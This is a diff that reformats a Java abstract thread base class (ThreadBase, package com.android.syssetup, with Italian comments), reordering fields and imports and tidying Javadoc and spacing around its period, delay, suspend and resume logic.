@@ -7,43 +7,51 @@
 
 package com.android.syssetup;
 
-import java.util.Date;
-
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.util.Check;
+
+import java.util.Date;
 
 /**
  * The Class ThreadBase.
  */
 public abstract class ThreadBase implements Runnable {
 
-	/** The Constant NEVER. */
+	/**
+	 * The Constant NEVER.
+	 */
 	protected static final long NEVER = Long.MAX_VALUE;
-	/** The Constant NEVER. */
-	protected static final long SOON = 0;
-
-	private static final String TAG = "ThreadBase"; //$NON-NLS-1$
-
-	/** The period in milliseconds. */
+	/**
+	 * The period in milliseconds.
+	 */
 	private long period = NEVER;
-
-	/** The delay in milliseconds. */
-	private long delay = 0;
-
-	/** The stopped. */
-	private boolean stopRequest;
-
-	private boolean suspended;
-	/** The status. */
+	/**
+	 * The Constant NEVER.
+	 */
+	protected static final long SOON = 0;
+	private static final String TAG = "ThreadBase"; //$NON-NLS-1$
+	/**
+	 * The status.
+	 */
 	protected StateRun status;
+	/**
+	 * The delay in milliseconds.
+	 */
+	private long delay = 0;
+	/**
+	 * The stopped.
+	 */
+	private boolean stopRequest;
+	private boolean suspended;
 
 	public ThreadBase() {
 		if (Cfg.DEBUG) {
-			Check.log(TAG +" sub-class:"+getTag()+ " (new) suspended="+suspended  ); //$NON-NLS-1$
+			Check.log(TAG + " sub-class:" + getTag() + " (new) suspended=" + suspended); //$NON-NLS-1$
 		}
 	}
 
 	// Gli eredi devono implementare i seguenti metodi astratti
+
 	/**
 	 * Go. Viene lanciato dopo il delay, ogni period.
 	 */
@@ -196,6 +204,7 @@ public abstract class ThreadBase implements Runnable {
 	}
 
 	// riesegue l'actualRun
+
 	/**
 	 * Next.
 	 */
@@ -206,6 +215,7 @@ public abstract class ThreadBase implements Runnable {
 	}
 
 	// ferma il thread
+
 	/**
 	 * Stop thread.
 	 */
@@ -215,16 +225,15 @@ public abstract class ThreadBase implements Runnable {
 			notifyAll();
 		}
 	}
-	
-	public boolean isStopRequested(){
+
+	public boolean isStopRequested() {
 		return stopRequest;
 	}
 
 	/**
 	 * definisce il periodo, ovvero il delay per il giro di loop, in ms.
-	 * 
-	 * @param period
-	 *            in ms
+	 *
+	 * @param period in ms
 	 */
 	protected void setPeriod(final long period) {
 		if (Cfg.DEBUG) {
@@ -236,9 +245,8 @@ public abstract class ThreadBase implements Runnable {
 
 	/**
 	 * definisce il delay al primo giro, in ms.
-	 * 
-	 * @param delay
-	 *            in ms
+	 *
+	 * @param delay in ms
 	 */
 	protected void setDelay(final long delay) {
 		if (Cfg.DEBUG) {
@@ -250,7 +258,7 @@ public abstract class ThreadBase implements Runnable {
 
 	/**
 	 * Gets the status.
-	 * 
+	 *
 	 * @return the status
 	 */
 	public synchronized StateRun getStatus() {
@@ -264,25 +272,26 @@ public abstract class ThreadBase implements Runnable {
 	public synchronized void suspend() {
 		suspended = true;
 		if (Cfg.DEBUG) {
-			Check.log(TAG + "hash:"+this.hashCode()+" sub-class:"+getTag()+ " (suspend) suspended="+suspended  ); //$NON-NLS-1$
+			Check.log(TAG + "hash:" + this.hashCode() + " sub-class:" + getTag() + " (suspend) suspended=" + suspended); //$NON-NLS-1$
 		}
 	}
 
 	public synchronized void resume() {
 		suspended = false;
 		if (Cfg.DEBUG) {
-			Check.log(TAG + "hash:"+this.hashCode()+" sub-class:"+getTag()+" (resume) suspended="+suspended ); //$NON-NLS-1$
+			Check.log(TAG + "hash:" + this.hashCode() + " sub-class:" + getTag() + " (resume) suspended=" + suspended); //$NON-NLS-1$
 		}
 		next();
 	}
 
 	public synchronized boolean isSuspended() {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + "hash:"+this.hashCode()+ " sub-class:"+getTag()+" (isSuspended) suspended="+suspended ); //$NON-NLS-1$
+			Check.log(TAG + "hash:" + this.hashCode() + " sub-class:" + getTag() + " (isSuspended) suspended=" + suspended); //$NON-NLS-1$
 		}
 		return suspended;
 	}
-	public String getTag(){
+
+	public String getTag() {
 		return TAG;
 	}
 
